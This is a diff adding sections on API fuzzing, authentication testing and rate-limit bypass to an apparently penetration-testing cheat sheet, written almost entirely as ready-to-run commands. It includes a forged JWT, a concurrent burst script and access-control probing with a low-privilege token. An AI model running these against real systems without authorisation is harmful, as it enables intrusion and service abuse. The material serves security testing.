@@ -748,3 +748,102 @@ for endpoint in users orders payments admin config settings; do
   fi
 done
 ```
+
+---
+
+## 9. API Fuzzing with Automated Tools
+
+### REST API Fuzzing with ffuf and Arjun
+
+```bash
+# Discover hidden HTTP parameters using Arjun
+arjun -u "https://target.com/api/v1/users" -m POST \
+  -H "Authorization: Bearer TOKEN" \
+  -o arjun_results.json
+
+# Fuzz API parameter values to find edge cases
+ffuf -u "https://target.com/api/v1/users/FUZZ" \
+  -w <(echo -e "0\n-1\n999999999\nadmin\nroot\nnull\nundefined\nNaN\ntrue\nfalse\n[]\n{}") \
+  -H "Authorization: Bearer TOKEN" \
+  -mc 200,201,500 -fc 404
+
+# Content-Type manipulation to trigger different parsing
+for ctype in "application/json" "application/xml" "application/x-www-form-urlencoded" "text/plain" "multipart/form-data"; do
+  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+    -X POST "https://target.com/api/v1/users" \
+    -H "Authorization: Bearer TOKEN" \
+    -H "Content-Type: $ctype" \
+    -d '{"name":"test"}')
+  echo "[$ctype] -> $STATUS"
+done
+```
+
+### API Authentication Testing Suite
+
+```bash
+# Test token expiration handling
+EXPIRED_TOKEN=$(python3 -c "
+import jwt, time, base64, json
+payload = {'sub':'user','exp':int(time.time())-3600}
+header = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=').decode()
+body = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
+print(f'{header}.{body}.fake_sig')
+")
+curl -s "https://target.com/api/v1/profile" -H "Authorization: Bearer $EXPIRED_TOKEN" -w "\nHTTP: %{http_code}\n"
+
+# Test missing Authorization header
+curl -s "https://target.com/api/v1/admin/users" -w "\nHTTP: %{http_code}\n"
+
+# Test null/empty token
+curl -s "https://target.com/api/v1/profile" -H "Authorization: Bearer " -w "\nHTTP: %{http_code}\n"
+curl -s "https://target.com/api/v1/profile" -H "Authorization: Bearer null" -w "\nHTTP: %{http_code}\n"
+```
+
+---
+
+## 10. API Rate Limit Bypass Advanced
+
+### Concurrent Request Rate Limit Bypass
+
+```python
+#!/usr/bin/env python3
+"""Bypass sliding window rate limits with concurrent burst requests."""
+import asyncio
+import aiohttp
+import time
+
+async def burst_test(url, token, count=50):
+    headers = {"Authorization": f"Bearer {token}"}
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        for i in range(count):
+            tasks.append(session.get(url, headers=headers))
+        
+        start = time.time()
+        responses = await asyncio.gather(*tasks, return_exceptions=True)
+        elapsed = time.time() - start
+        
+        success = sum(1 for r in responses if not isinstance(r, Exception) and r.status == 200)
+        rate_limited = sum(1 for r in responses if not isinstance(r, Exception) and r.status == 429)
+        
+        print(f"Sent {count} requests in {elapsed:.2f}s")
+        print(f"Success: {success} | Rate limited: {rate_limited} | Other: {count - success - rate_limited}")
+
+asyncio.run(burst_test("https://target.com/api/v1/sensitive-endpoint", "TOKEN", 50))
+```
+
+### API Version-based Access Control Testing
+
+```bash
+# Test if older API versions have weaker access controls
+for version in v1 v2 v3 beta internal staging; do
+  for endpoint in users admin/config settings debug; do
+    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+      "https://target.com/api/$version/$endpoint" \
+      -H "Authorization: Bearer LOW_PRIV_TOKEN")
+    if [ "$STATUS" != "404" ] && [ "$STATUS" != "401" ]; then
+      echo "[+] /api/$version/$endpoint -> $STATUS"
+    fi
+  done
+done
+```
